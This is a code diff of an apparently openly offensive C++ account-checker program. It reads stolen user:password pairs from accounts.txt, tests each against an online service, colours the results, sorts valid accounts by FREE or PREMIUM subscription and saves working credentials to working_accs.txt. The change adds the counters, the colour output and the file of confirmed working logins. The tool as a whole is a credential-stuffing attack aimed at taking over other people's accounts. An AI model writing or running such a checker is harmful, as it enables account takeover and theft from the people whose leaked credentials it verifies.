@@ -12,6 +12,8 @@
 #   pragma comment (lib, "curl/libcurl_a.lib")
 #endif
 
+enum colors { black, blue, green, cyan, red, magenta, brown, lightgrey, darkgrey, lightblue, lightgreen, lightcyan, lightred, lightmagenta, yellow, white };
+
 struct MemoryStruct {
 	char *memory;
 	size_t size;
@@ -73,6 +75,10 @@ auto main(void) -> int
 	std::string line;
 	std::ifstream file("accounts.txt");
 	std::string user, pw;
+	int working = 0, nonWorking = 0;
+
+	std::ofstream output;
+	output.open("working_accs.txt", std::ofstream::out | std::ofstream::trunc);
 
 	while (getline(file, line)) {
 		int pos = line.find_first_of(':');
@@ -82,8 +88,13 @@ auto main(void) -> int
 		if (user.length() > 1 && pw.length() > 4) // I'm unsure if these are the right values
 		{
 			auto returnData = getData(user, pw);
-			if (returnData.find("errorInvalidCredentials") != std::string::npos)
-				printf("%s:%s - Invalid account credentials\n", user.c_str(), pw.c_str());
+			if (returnData.find("errorInvalidCredentials") != std::string::npos) 
+			{
+				SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), lightred);
+				printf("%s:%s \n", user.c_str(), pw.c_str());
+				SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+				nonWorking++;
+			}
 			else
 			{
 				std::string type;
@@ -92,7 +103,11 @@ auto main(void) -> int
 				else
 					type = "PREMIUM";
 
-				printf("%s:%s - Valid account! Subscription type: %s\n", user.c_str(), pw.c_str(), type.c_str());
+				SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), lightgreen);
+				printf("%s:%s - %s\n", user.c_str(), pw.c_str(), type.c_str());
+				SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+				working++;
+				output << user << ":" << pw << "\n";
 			}
 		}
 		else
@@ -101,6 +116,11 @@ auto main(void) -> int
 			printf("Press any key to check another account.\n");
 		}
 	}
-	system("pause");
+	file.close();
+	output.close();
+
+	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), yellow);
+	printf("\n\n------------Found %i working accounts and %i non working accounts------------", working, nonWorking);
+	std::getchar();
 	return 1;
 }
